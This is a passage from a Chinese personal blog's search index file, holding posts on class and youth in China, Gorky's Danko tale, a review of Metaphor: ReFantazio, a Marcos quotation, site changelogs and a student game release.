年。那么，前后加起来可就是二十几年了，他们也奔50了。人生到了50岁时，才终于拥有产权属于自己的两居室，尽管总算有份”物业”了，恐怕也还只是”小康人家”，而非”中产”。</p><p>何况，他们自己也总是要做父母的。一旦有了儿女，那一份支出就大为可观了，那一份操心也不可等闲视之。于是，拥有产权属于自己的一套房子的目标，便离他们比遥远更遥远了。倘若双方父母中有一位甚至有两位同时或先后患了难以治疗的疾病，他们小家庭的生活状况也就可想而知了。</p><p>好在，据我了解，这样一些青年，因为终究是知识分子家庭的后代，可以”知识出身”这一良好形象为心理的盾，抵挡住贫富差距巨大的社会现实的猛烈击打。所以，他们在精神状态方面一般还是比较乐观的。</p><p>他们普遍的人生主张是活在当下，抓住当下，享受当下；更在乎的是于当下是否活出了好滋味，好感觉。这一种拒瞻将来，拒想将来，多少有点儿及时行乐主义的人生态度，虽然每令父母辈摇头叹息，对他们自己却未尝不是一种明智。</p><p>并且，他们大抵是当下青年中的晚婚主义者。内心潜持独身主义者，在他们中也为数不少。1&#x2F;3 左右按正常年龄结婚的，打算做”丁克”一族者亦大有人在。</p><p>在中国当下青年中，他们是格外重视精神享受的。他们也青睐时尚，但追求比较精致的东西，每自标品位高雅。他们是都市文化消费的主力军，并且对文化标准的要求往往显得苛刻，有时近于尖刻。</p><p>他们中一些人极有可能一生清贫，但大抵不至于潦倒，更不至于沦为”草根”或弱势。成为物质生活方面的富人对于他们既已不易，他们便似乎都想做中国之精神贵族了。事实上，他们身上既有雅皮士的特征，也确乎同时具有精神贵族的特征。</p><p>一个国家是不可以没有一些精神贵族的。绝然没有，这个国家的文化也就不值一提了。即使在非洲部落民族，也有以享受他们的文化精品为快事的 “精神贵族”。</p><p>他们中有不少人将成为中国未来高品质文化的守望者。不是说这类守望者只能出在他们中间，而是说由他们之间产生更必然些，也会更多些。</p><h2 id="城市平民阶层的儿女"><a href="#城市平民阶层的儿女" class="headerlink" title="城市平民阶层的儿女"></a>城市平民阶层的儿女</h2><p>出身于这个阶层的当下青年，尤其受过高等教育的他们，相当一部分内心是很凄凉悲苦的。</p><p>因为他们的父母，最是一些”望子成龙”、”望女成凤”的父母，此类父母的人生大抵历经坎坷，青年时过好生活的愿景强烈，但这愿景后来终于被社会和时代所粉碎。</p><p>但愿景的碎片还保存在内心深处，并且时常也还是要发一下光的，所谓未泯。设身处地想一想确实令人心疼。中国城市平民人家的生活从前肯定比农村人家强，也是被农民所向往和羡慕的。</p><p>但现在是否还比农民强，那则不一定了。现在不少的城市平民人家，往往会反过来羡慕农村富裕的农民，起码农村里那些别墅般的二三层小楼，便是他们每一看见便会自叹弗如的。但若有农民愿与他们换，他们又是肯定摇头的。他们的根已扎在城市好几代了，不论对于植物还是人，移根是冒险的，会水土不服。对于人，水土不服却又再移不回去，那痛苦就大了。</p><p>“所谓日子，过的还不是儿女的日子！”这是城市平民父母们之间常说的一句话，意指儿女是唯一的精神寄托，也是唯一过上好日子的依赖，更是使整个家庭脱胎换骨的希望。</p><p>故他们与儿女的关系，很像是体育教练与运动员的关系，甚至是拳击教练与拳手的关系。在他们看来，社会正是一个大赛场，而这也基本是事实，起码目前在中国是一个毫无疑问的事实。所以他们常心事重重、表情严肃地对儿女们说：”孩子，咱家过上好生活可全靠你了。”</p><p>出身于城市平民人家的青年，从小到大，有几个没听过父母那样的话呢？</p><p>可那样的话和十字架又有什么区别？话的弦外之音是——你必须考上名牌大学；只有毕业于名牌大学才能找到好工作；只有找到好工作才有机会出人头地；只有出人头地父母才能沾你的光在人前骄傲，并过上幸福又有尊严的生活；只有那样，你才算对得起父母……即使嘴上不这么说，心里也是这么想的。</p><p>于是，儿女领会了——父母是要求自己在社会这个大赛场上过五关斩六将，夺取金牌金腰带的。于是对于他们，从小学到大学都成了赛场或拳台。然而除了北京、上海，在任何省份的任何一座城市，考上大学已需终日刻苦，考上名牌大学更是谈何容易！</p><p>并且，通常规律是——若要考上名牌大学，先得挤入重点小学。对于平民人家的孩子，上重点小学简直和考入名牌大学同样难，甚至比考上名牌大学还难。名牌大学仅仅以高分为王，进入重点小学却是要交赞助费的，那非平民人家所能承受得起。往往即使借钱交，也找不到门路。</p><p>故背负着改换门庭之沉重十字架的平民家庭的儿女们，只有从小就将灵魂交换给中国的教育制度，变自己为善于考试的机器。</p><p>但即使进了重点初中、重点高中、重点大学，终于跃过了龙门，却发现在龙门那边，自己仍不过是一条小鱼。而一迈入社会，找工作虽比普通大学的毕业生容易点儿，工资却也高不到哪儿去。本科如此，硕士博士，情况差不多也是如此，于是倍感失落……</p><p>另外一些只考上普通大学的，高考一结束就觉得对不起父母了，大学一毕业就更觉得对不起父母了。那点儿工资，月月给父母，自己花起来更是拮据。不月月给父母，不但良心上过不去，连面子上也过不去。</p><p>家在本市的，只有免谈婚事，一年又一年地赖家而居。天天吃着父母的，别人不说”啃老”，实际上也等于”啃老”。家在外地的，当然不愿让父母了解到自己变成了”蜗居”的”蚁族”。和农村贫困人家的儿女们一样，他们是中国不幸的孩子，苦孩子。</p><p>我希望中国以后少争办些动辄”大手笔”地耗费几千亿的”国际形象工程”，省下钱来，更多地花在苦孩子们身上——这才是正事！</p><p>他们中考上大学者，几乎都可视为坚卓毅忍之青年。</p><p>他们中有人最易出现心理问题，倘缺乏关爱与集体温暖，每酿自杀自残的悲剧，或伤害他人的惨案。然他们总体上绝非危险一族，而是内心最郁闷、最迷惘的一族，是纠结最多、痛苦最多，苦苦挣扎且最觉寡助的一族。</p><p>他们的心，敏感多于情感，故为人处世每显冷感。对于帮助他们的人，他们心里也是怀有感激的，却又往往倍觉自尊受伤的刺痛，结果常将感激封住不露，饰以淡漠的假象。而这又每使他们给人以不近人情的印象。这种时候，他们的内心就又多了一种纠结和痛苦。比之于同情，他们更需要公平；比之于和善相待，他们更需要真诚的友谊。</p><p>谁如果与他们结下了真诚的友谊，谁的心里也就拥有了一份大信赖，他们往往会像狗忠实于主人那般忠实于那份友谊。他们那样的朋友是最难交的，居然交下了，大抵是一辈子的朋友。一般情况下，他们不会轻易或首先背叛友谊。</p><p>他们像极了于连。与于连的区别仅仅是，他们不至于有于连那么大的野心。事实上他们的人生愿望极现实，极易满足，也极寻常。但对于他们，连那样的愿望实现起来也需不寻常的机会。</p><p>“给我一次机会吧！”——这是他们默默在心里不知说了多少遍的心语。但又一个问题是——此话有时真的有必要对掌握机会的人大声地说出来，而他们往往比其他同代人更多了说之前的心理负担。</p><p>他们中之坚卓毅忍者，或可成将来靠百折不挠的个人奋斗而成功的世人偶像；或可成将来足以向社会贡献人文思想力的优秀人物。</p><p>人文思想力通常与锦衣玉食者无缘。托尔斯泰、雨果们是例外，并且考察他们的人生，虽出身贵族，却不曾以锦衣玉食为荣。</p><h2 id="农家儿女"><a href="#农家儿女" class="headerlink" title="农家儿女"></a>农家儿女</h2><p>家在农村的大学生，或已经参加工作的他们，倘若家乡居然较富，如南方那种绿水青山、环境美好且又交通方便的农村，则他们身处大都市所感受的迷惘，反而要比城市平民的青年少一些。</p><p>这是因为，他们的农民父母其实对他们并无太高的要求。倘他们能在大都市里站稳脚跟，安家落户，父母自然高兴；倘他们自己觉得在大都市里难过活，要回到省城工作，父母照样高兴，照样认为他们并没有白上大学；即使他们回到了就近的县城谋到了一份工作，父母虽会感到有点儿遗憾，但不久那点儿遗憾就会过去的。</p><p>很少有农民对他们考上大学的儿女们说：”咱家就指望你了，你一定要结束咱家祖祖辈辈都是农民的命运！”他们明白，那绝不是一个受过高等教育的儿女所必然能完成的家庭使命。</p><p>他们供儿女读完大学，想法相对单纯：只要儿女们以后比他们生活得好，一切付出都是值得的。中国农民大多是些不求儿女回报什么的父母。他们对土地的指望和依赖甚至要比对儿女们还多一些。</p><p>故不少幸运地在较富裕的农村以及小镇小县城有家的、就读于大都市漂泊于大都市的学子和青年，心态比城市平民（或贫民）之家的学子、青年还要达观几分。因为他们的人生永远有一条退路——他们的家园。</p><p>如果家庭和睦，家园的门便永远为他们敞开，家人永远欢迎他们回去。所以，即使他们在大都市里住的是集装箱——南方已有将空置的集装箱租给他们住的现象——他们往往也能咬紧牙关挺过去。</p><p>他们留在大都市艰苦奋斗，甚至年复一年地漂泊在大都市，完全是他们个人心甘情愿的选择，与家庭寄托之压力没什么关系。如果他们实在打拼累了，往往会回到家园休养、调整一段时日。</p><p>同样命运的城市平民或贫民人家的儿女，却断无一处”稚子就花拈蛱蝶，人家依树系秋千”，”罗汉松遮花里路，美人蕉错雨中棂”的家园可以回归。坐在那样的家门口，回忆儿时”争骑一竿竹，偷折四邻花”之往事，真的近于是在疗养。</p><p>即使并没回去，想一想那样的家园，也是消累解乏的。故不论他们是就读学子、公司青年抑或打工青年，精神上总有一种达观在支撑着。是的，那只不过是种达观，算不上是乐观。但是能够达观，也已很值得为他们高兴了。</p><p>不论一个当下青年是大学校园里的学子、大都市里的临时就业者或季节性打工者，若他们的家不但在农村，还在偏僻之地的贫穷农村，则他们的心境比之于以上一类青年，肯定截然相反。</p><p>回到那样的家园，即使是年节假期探家一次，那也是忧愁的温情有，快乐的心情无。打工青年们最终却总是要回去的。</p><p>大学毕业生回去了毫无意义——不论对他们自己，还是对他们的家庭。他们连省城和县里也难以回去，因为省城也罢，县里也罢，适合于大学毕业生的工作，根本不会有他们的份儿。而农村，通常也不会直接招聘什么大学毕业生”村官”的。</p><p>所以，当他们用”不放弃！绝不放弃！”之类的话语表达留在大都市的决心时，大都市应该予以理解，全社会也应该予以理解。</p><p>这是一个最好的时代！<br>这是一个最坏的时代！</p><p>以上两句话，是狄更斯小说《双城记》的开篇语。那究竟是一个怎样的时代，此不赘述。狄氏将”好”写在前，将”坏”写在后，意味着他首先是在肯定那样一个时代。在此借用一下他的句式来说：</p><p>当代中国青年，他们是些令人失望的青年。<br>当代中国青年，他们是些足以令中国寄托希望的青年。</p><p>说他们令人失望，乃因以中老年人的眼看来，他们身上有太多毛病。诸毛病中，以独生子女的娇骄二气、”自我中心”的坏习性、逐娱乐鄙修养的玩世不恭最为讨嫌。</p><p>说他们足以令中国寄托希望，乃因他们是自1949年以后最真实地表现为人的一代，也可以说是忠顺意识之基因最少，故而是真正意义上脱胎换骨的一代。</p><p>在他们眼中，世界真的是平的；在他们的思想的底里，对民主、自由、人道主义、社会公平正义的尊重和诉求，也比1949年以后的任何一代人都更本能和更强烈……</p><p>只不过，现在还没轮到他们充分呈现影响力，而他们一旦整体发声，十之七八都会是进步思想的认同者和光大者。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>丹柯</title>
+      <link href="/2024/12/11/%E4%B8%B9%E6%9F%AF/"/>
+      <url>/2024/12/11/%E4%B8%B9%E6%9F%AF/</url>
+      
+        <content type="html"><![CDATA[<p>作者：<a href="https://baike.baidu.com/item/%E9%A9%AC%E5%85%8B%E8%A5%BF%E5%A7%86%C2%B7%E9%AB%98%E5%B0%94%E5%9F%BA/10841120">高尔基</a></p><p>&emsp; 古时候，在大地上住着一族人，穿越不过的森林从三面把这族人的营地包围着，而在第四面——才是一片草原。这是些愉快的、强有力的而又勇敢的人。但是有一次，艰难的时候来临了：不知从什么地方出现了另外一族人，就是从前的这群人都驱赶到森林的深处去。</p><p>&emsp; 因为这座森林非常古老，在那儿尽是泥沼和黑暗，树枝又这样密层层地交缠在一起，透过这些树枝都看不见天空，而太阳的光线也好不容易才穿过浓密的树叶，为自己打穿一条照到泥沼的路。但是当它的光线落到泥沼的水面上时，泥沼就升起一阵恶臭，而人们就因为这种恶臭接二连三地死掉了。那时候，这一族人的女人和孩子们都开始哭泣起来，而父亲们则在沉思着，天天堕进了忧愁。必须走出这座森林，要这样做那就只有两条路：一条是后退，——在那儿有着强悍的和凶恶的敌人；还另有一条路是前进，——但矗立着巨人似的树木，它们用粗大的树枝互相紧紧地拥抱着，把交错的树根深深地插进泥沼的粘滑的污泥里面。白天的时候，这些像石头一样的树木，静默无语地，动也不动地在灰暗的暮霭里矗立着，可是每当夜晚人们燃起篝火时，它们就更加密实地在人们的四周围紧逼过来。无论是白天还是黑夜，始终有一个坚固的黑暗的圈子，把这些人包围住，它好像要压倒他们。而这些人本来是习惯于草原的空旷的。可是还有更可怕的，就是当风吹打着树梢，整个森林都阴沉地喧响起来的时候，就像是在威胁他们，为这些人唱送葬的歌似的。但无论怎样说，这毕竟是些强有力的人，他们能够和那些曾经一度战胜过他们的人们作殊死的斗争，他们知道不能在斗争中死掉，因为他们有着许多先人的遗训，假如他们轻易死掉的话，那么他们的遗训就也和他们同归于尽了。因，他们在漫漫的长夜里，在森林的阴沉的喧响之下，在泥沼的毒臭之中坐着想着。他们这样坐着，而篝火所照出来的影子，就在他们的四周围跳着无声的舞蹈，这一切看起来，好像并不是影子在跳舞，而是森林和泥沼的恶毒的幽灵在狂欢胜利……大家还是坐着和想着。但从没有一种东西，无论是工作、或者是女人，比这些忧愁的思想更能使这些人的身体和心灵困乏。大家都因为想得太多而困惫无力了……恐怖在大家的心里诞生，用坚强的手把他们束缚住了。女人们为那些死于恶臭的人们的尸体和那被恐惧所束缚住的活人的命运而哭泣，更加引起了恐慌，——于是在森林里面开始可以听见懦怯的话语了。最初这还是胆小的和低声的絮语，但是后来声调越来越高了……他们想走到敌人那里去，向敌人献出他们自己的自由，被死所威吓住了的人，再也不害怕奴隶的生活了……但就在这个时候，丹科出现了，他一个人救活了所有人的性命。 </p><p>&emsp; 丹科是这群人当中的一个漂亮的年轻人。美丽的人时常都是勇敢的人。现在他就向他们，向自己的伙伴们这样讲道：“只靠空想，是推不开挡在大路上的石头的。谁什么事都不做，谁就会毫无办法。我们为什么要把精力都浪费在空想和忧愁上呢？起来吧，让我们走进森林，穿越过它，要晓得，它总有个尽头的——世界上一切的事情都有个尽头的！走吧！喏！嗨！”大家都看着他，看出他是所有人中间的一个最优秀的人，因为在他的两只眼睛里面，闪耀着无穷的力量和活生生的火光。 </p><p>&emsp; “你带领着我们走吧！”他们说道。 </p><p>&emsp; 那时候他就带领着他们向前走…… </p><p>&emsp; 丹科带领着他们。大家都友好地跟在他后面走——大家都深信他。这是一条艰苦的道路呀！黑暗得很，他们每走一步，泥沼就张开它贪欲的污泥的嘴，要把人们吞噬进去；而树木则像一座牢固的墙壁，阻挡住他们的去路。树枝互相缠住他们；树根正像蛇一样地到处伸延着。每走一步路都要这些人耗费很多的汗和血。他们走了很久……森林是愈来愈浓密了，大家的气力也愈来愈小了！于是大家开始埋怨丹科，说他是个年轻而没有经验的人，正把他们带领到死亡城去。但丹科始终是走在他们的前面，勇敢而又泰然。但有一次，一阵大雷雨在森林的上空震响起来，树木阴沉地、威严地喧嚣着。那时候，森林里变得非常黑暗，就好像自从世界诞生以来的所有的黑夜，一下子都聚集在它里面一样。这些渺小的人，在巨大的树木之间和在闪电的威严的咆啸之下走着，他们走着，摇晃着，巨人似的树木发出咯吱咯吱的声音，吼着愤怒的歌曲；而闪电飞过了林梢，刹那间用青色的寒光照了一下树林，马上又消逝了，威吓着人们。那些被寒冷的电光所照亮了的树木，好像是活生生似的，向这些被囚禁在黑暗中的人的四周伸出弯曲的无数长手，编成一个密密的网子，阻挡住人们前进。从那黑暗当中，又好像有某种什么可怕的、黑暗而又冷酷的东西，在看着这些走着的人们。这是一条艰苦的道路，那些被它折磨够了的人们都丧失了勇气。不过他们羞于承认自己的无力，于是他们就把怨恨和愤怒发泄到那个走在他们前面的人——丹科身上。他们开始责备他没有能力带领他们，——瞧，他们就是这样的！大家都停下来了，在森林的胜利的喧扰之下，在战栗着的黑暗之中，这群疲倦了和凶恶的人们就开始审问丹科。他们吼道：“你是个对我们毫不足道和有害的人！你带领着我们，把我们都弄得疲惫了，为了这，你就应该死！”“你们说过：‘带领吧！’因此我才带领你们的！”丹科向他们挺起胸膛这样高叫道，我心里有带领的勇气，因此我才带领你们！而你们呢？你们做了些什么能有助你们自己的事呢？你们只是走着，而不能为了更遥远的路程保存你们的力量！你们只是走着、走着，正像一群绵羊！” </p><p>&emsp; “你该死！你该死！“他们叫道。 </p><p>&emsp; 森林还是在怒吼着，怒吼着，重复着他们的叫喊声，而闪电则把黑暗撕成一块块的碎片。丹科看着那些他费力所带领的人，看见这些人就好像是群野兽一样，站在他的周围，他们的面孔上找不到一点高尚的品格。丹科知道绝不能得到这些人什么宽恕，这时候他的心里沸腾起一阵愤怒之火，但因为怜悯这些人而又熄灭下去了。他爱人们，他想：也许没有了他，这些人真会毁灭掉的。于是在他的心里就迸发出了一阵想要拯救他们的愿望的火光，要把他们带领到容易走的路上去，这时候在他的眼睛里就闪耀出一种强烈的火焰的光线……当人们看见这种情形的时候，以为他要发狂了，所以他的眼睛才这样明亮地燃烧着。可是他们像狼群一样地准备起来，等待着，猜疑他会同他们搏斗，因此他们把他包围得更紧了，为了更容易抓住和杀死丹科。而他也早已明白了他们的心思，因此他的心也燃烧得更加明亮，因为他们的这个心思，在他的心里产生了一种忧虑。“森林还是在唱着它的阴沉的歌曲，雷还在轰响着，雨还在下着……“我要为人们做些什么事呢？！”丹科比雷声更有力地狂叫道。他忽然用双手撕开他自己的胸膛，从里面挖出他自己的那颗心，把它高高地举在头顶上。那颗心正像太阳一样明亮地燃烧着，而且比太阳还更明亮，整个森林静默无声了，都被这个对于人类伟大的爱的火炬照得通亮，而黑暗也因为它的光亮向四面八方逃跑了，躲进森林的深处战栗着，或者堕进到泥沼的深洞口里去。人们呢，大惊失色，变得像石头一样。 </p><p>&emsp; “我们走吧！”丹科高叫着，他冲到所有人的前面的位置上去，高高地举着那颗炽燃的心，给人们照亮着道路。 </p><p>&emsp; 他们都像着了魔似地跟在他后面走。这时候森林又重新咆啸起来，惊奇地摇摆着树梢，但是它的咆啸声，全被奔跑的人们的脚步声所淹没了。大家都迅速地勇敢地奔跑着，为这颗炽燃的心的惊人的景象所吸引着。现在即使有人毁灭了，但是他们也会毫无怨言和眼泪地死掉。丹科始终是走在前面，他的心始终在燃烧着，燃烧着！ </p><p>&emsp; 森林闪避不及地在他们前面让开路来，待他们走过却又仍然是密层层的和哑默的留在后面。而丹科和所有的人，立刻就像沉浸在充满着阳光，有着新鲜的空气和被雨水所洗刷过的大海中。雷雨还在那儿，在他们后面，在森林的上空；而这儿太阳照耀着，草原透散着清鲜，草儿带着钻石一样的雨珠在闪耀着，大河也泛着金光……这正是黄昏的时分，由于太阳落山时的光线，大河变成了红色，就好像是从丹科被撕开了的胸膛里所流出的热血一样。 高傲的勇士丹科，向出现在自己前面的草原的空旷投射出视线，——他向自由的大地投射出快乐的视线，并且骄傲地大笑起来，然后他倒了下去——就死掉啦。 </p><p>&emsp; 那些快乐的和充满了希望的人们，并没有注意到他的死亡，也没有看见那颗勇敢的心还在丹科的身体旁边燃烧着。只有一个谨慎小心的人注意到这件事，他害怕得什么似的，就用脚踏在那颗高傲的心上……于是它就碎散成为许多火星而熄灭了…… </p><p>&emsp; 草原上的那些天蓝色的火星，这些在暴风雨来临之前出现的火星，就是从那儿来的！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《暗喻幻想》游戏评测</title>
+      <link href="/2024/12/11/%E3%80%8A%E6%9A%97%E5%96%BB%E5%B9%BB%E6%83%B3%E3%80%8B%E6%B8%B8%E6%88%8F%E8%AF%84%E6%B5%8B/"/>
+      <url>/2024/12/11/%E3%80%8A%E6%9A%97%E5%96%BB%E5%B9%BB%E6%83%B3%E3%80%8B%E6%B8%B8%E6%88%8F%E8%AF%84%E6%B5%8B/</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/%E6%9A%97%E5%96%BB%E5%B9%BB%E6%83%B3%EF%BC%9AReFantazio/63096089">暗喻幻想百度百科</a><br><img src="https://p.qpic.cn/mwegame/0/b82dc574b49e2a9fa4c1492bab5b890f/" alt="暗喻幻想"></p><h2 id="选择了崇高别离的人啊，恐惧和不安都将成为你的光辉"><a href="#选择了崇高别离的人啊，恐惧和不安都将成为你的光辉" class="headerlink" title="选择了崇高别离的人啊，恐惧和不安都将成为你的光辉"></a>选择了崇高别离的人啊，恐惧和不安都将成为你的光辉</h2><p>   这是我这些年见到的游戏文本中，最饱含力量和希望的一句话。</p><p>   尽管直到游戏通关才理解它的真正含义，它却真正地成为了我心灵的灯塔。</p><h3 id="有关游戏玩法"><a href="#有关游戏玩法" class="headerlink" title="有关游戏玩法"></a>有关游戏玩法</h3><p>对于没有玩过前作女神转生系列的我来说，战斗系统和迷宫式是相当好玩的，策略性相比p5提升好多，hp和mp不足时被强敌追着满地图跑也是相当有意思，当然，被红点怪物突袭血压一下就上来了（如果是困难模式几乎必死无疑，只能眼看着被强而有力的人类一套带走，然后看一段‘幻想破灭’的动画）</p><h3 id="有关叙事"><a href="#有关叙事" class="headerlink" title="有关叙事"></a>有关叙事</h3><p>这么王道的剧情也算是很常见了，但是每次过场动画都很精彩。主线剧情始终能给人期待，大地图对话细节很充足（每个阶段都会有不同对话，这点做的非常到位了），支线继承并发扬了女神历代coop短小无力的特点，但我想如果多花些精力叙述会很不错，因为这些故事本身有吸引人的地方。</p><h3 id="有关剧情"><a href="#有关剧情" class="headerlink" title="有关剧情"></a>有关剧情</h3><p><span style='color:grey;font-size:smaller'>介意剧透可跳过，我当然是希望你介意的</span></p><p>在游戏中，人类的时代已然灭绝，人类的后代分化成不同的种族，贵贱分明，观念差别很大，彼此多有敌视。</p><p>主人公的父亲为孩子搭建了逃离现实的幻想之所，在这个幻想之地，没有种族，没有歧视，人与人和平共处，好似现实中的现代社会。</p><p>但，正如游戏中所说的，那也许并不如幻想中那么美好。</p><p>矛盾始终存在，即使是如此美好的幻想也终究会覆灭，现实并不美好。</p><p>因此，游戏中的主人公即使在现实中已然将死，也拒绝了眼前美好的幻想之地，回归了现实。</p><p>为了不让自己变成危害国民的怪物，变成恶人的凶器，他忍着剧痛掏出自己的心脏，将其捏碎。</p><p>王之所以为王，正因为无比纯洁善良的内心，强大的信念，和无论多么艰难的处境，都直面现实的勇气。</p><p>如此伟大的君王，王冠戴在头上之时，正是整个国家和人民的荣幸。</p><p>因此我认为，Atlus对这位君王的塑造，是合格的。</p><p>我每每想起丹柯，这位人类领导者，探索者的象征。</p><p>“他忽然用双手撕开他自己的胸膛，从里面挖出他自己的那颗心，把它高高地举在头顶上。那颗心正像太阳一样明亮地燃烧着，而且比太阳还更明亮。”</p><p>“‘我们走吧！’丹柯高叫着，他冲到所有人的前面的位置上去，高高地举着那颗炽燃的心，给人们照亮着道路。他们都像着了魔似地跟在他后面走。”</p><p>无论是何时读起来，都震撼与激动。</p><p>那么，我也把那篇文章记在这里的笔记里吧。</p><h3 id="游戏本身"><a href="#游戏本身" class="headerlink" title="游戏本身"></a>游戏本身</h3><p>我很喜欢，要说缺点，可能是惊喜感不足吧。</p><p>黑神话得年度最佳我肯定很开心，但我心中隐隐希望暗喻幻想能得，也许是因为有什么地方触动了我，也许是因为我在莫尔身上看到诸多相似之处，好比，我也是困在幻想与现实夹缝之人。</p><blockquote></blockquote><p>TGA年度游戏结果公布，暗喻幻想得了年度最佳艺术指导和年度最佳叙事。</p><p>最佳艺术指导有点怪怪的，视觉效果确实不错的，但是离最佳可能还是有点距离，没错，我是说只拿了年度最佳动作冒险的黑猴。</p><p>跳转 <a href="../../13/%E5%85%B3%E4%BA%8Etga2024/">关于tga2024</a><br><span style='font-size:smaller;'><br>2024年12月13日补<br></span></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 游戏 </category>
+          
+          <category> 评测 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 游戏评测 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>副司令马斯科</title>
+      <link href="/2024/12/11/%E5%89%AF%E5%8F%B8%E4%BB%A4%E9%A9%AC%E6%96%AF%E7%A7%91/"/>
+      <url>/2024/12/11/%E5%89%AF%E5%8F%B8%E4%BB%A4%E9%A9%AC%E6%96%AF%E7%A7%91/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>副司令马斯科1994年5月28日发出的公报的附言</p></blockquote><p>“附言——致你们之中对马科斯是否为同性恋感到疑惑的人：马科斯是旧金山的同性恋者，南非的黑人，欧洲的亚洲人、圣伊西德罗的墨西哥裔移民，西班牙的无政府主义者，以色列的巴勒斯坦人，圣克利斯托瓦尔街上的原住民，贫民窟中的帮派分子，大学城中的摇滚青年，纳粹德国的犹太人，墨西哥国防部里的廉政调查员，政党中的女性主义者，后冷战时代的共产党人，西塔拉巴的囚犯，波斯尼亚的和平主义者，安第斯山中的马普切人，国家教师工会中的教师，没有画廊或画册的艺术家，墨西哥任何部分、任何一座城市、任何一条街区上星期六晚上的家庭主妇，二十世纪末墨西哥的游击队员，独立工会中的罢工者，被迫编造花边新闻的记者，女权运动中的性歧视者，夜晚10点地铁上的单身女人，于墨西哥城宪政广场上静坐的退休老人，无地的农民，待业的编辑，失业的工人，没有病人的医生，反叛的学生，新自由主义的异议者，没有书或没有读者的作家，当然了，还是墨西哥东南的萨帕塔人。总之，马科斯是这世界上的任何一个人。马科斯是所有那些遭排斥的、受迫害的、抵抗的、迸发出呼唤：受够了就是受够了！（¡Ya basta!）的少数群体。所有少数群体开口说话之日，便是强势群体陷入沉默与忍受之时。所有遭排斥的人们，寻找着语词，自己的语词，令强势群体分崩离析。所有那些令权力和良知不适之人——这就是马科斯。”</p><blockquote><p>笔记</p></blockquote><p>反抗伴压迫而生，存在不公平不完满的地方就一定有矛盾与反抗。反抗是文明迈步向前时手中紧攥的武器，无论时代是安宁还是困苦，反抗都将永不停息。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（2）</title>
+      <link href="/2024/12/10/%E6%97%A5%E5%BF%97%EF%BC%882%EF%BC%89/"/>
+      <url>/2024/12/10/%E6%97%A5%E5%BF%97%EF%BC%882%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>更改</p></blockquote><p>修正了ai页面位移和快捷键i强制打开搜索栏的问题，其他快捷键依旧会在输入中起作用，也许需要改后端，我还在学习，应该很快可以解决，<del>除非我懒得解决了</del>。</p><p>修改了页面布局，添加了内容隐藏<br><span style="color: gray; font-size: smaller;"><br>隐藏的不过是些倒不出来的垃圾，想要查看隐藏内容也可以直接找我<br></span></p><blockquote><p>问题</p></blockquote><p> github展示图片速度有点慢，我又不想买图床，等我有了自己的服务器再说吧。</p><p> 我发现我本地传api到公网上也有点困难，ai可能要一睡不醒了。</p><p> 那么，就这些</p><blockquote><p>追加<br>   手机端切换目录(如切换到日志)缺少一个回到All的按键</p><blockquote><p>再追加<br>      部分相对路径链接每次第一次打开都会404，正在寻求解决办法</p></blockquote></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>分享我第一个完成创作的游戏</title>
+      <link href="/2024/12/10/%E5%88%86%E4%BA%AB%E6%88%91%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%88%90%E5%88%9B%E4%BD%9C%E7%9A%84%E6%B8%B8%E6%88%8F/"/>
+      <url>/2024/12/10/%E5%88%86%E4%BA%AB%E6%88%91%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%88%90%E5%88%9B%E4%BD%9C%E7%9A%84%E6%B8%B8%E6%88%8F/</url>
+      
+        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>   名字叫《绝境逢光》，和其他三个伙伴一起创作的游戏,我担任策划。<br>   本来是为了参加taptap首届聚光灯GameJam，结果没能按期完成。<br><small style="color: gray;">学习游戏制作这段时间的事我也想写一写。</small><br>   内容也不多，bug也不少，嗨——哎我真要被气死了，谁能告诉我fittencode自动补全怎么关啊，它是不是觉得自己很知道我想说什么啊？ </p><p>   <a href="/game/LightInWar.apk">点此下载</a><br>   TapTap详情页(未上传下载渠道)：<a href="https://www.taptap.cn/app/726480">https://www.taptap.cn/app/726480</a><br>    一定注意是手机游戏喔，没有电脑版喔，只支持安卓喔，安卓版本不能高了也不能低了喔（v11-12）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 游戏 </category>
+          
+          <category> 创作 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 游戏 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（0）</title>
+      <link href="/2024/12/10/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%970/"/>
+      <url>/2024/12/10/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%970/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h2 id="Test"><a href="#Test" class="headerlink" title="Test."></a>Test.</h2></blockquote><p>测试专用，练习一下</p><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><h2 id="标题-1"><a href="#标题-1" class="headerlink" title="标题"></a>标题</h2><h3 id="标题-2"><a href="#标题-2" class="headerlink" title="标题"></a>标题</h3><p>&emsp; 缩进</p><blockquote><p>这是个引用块儿<br>   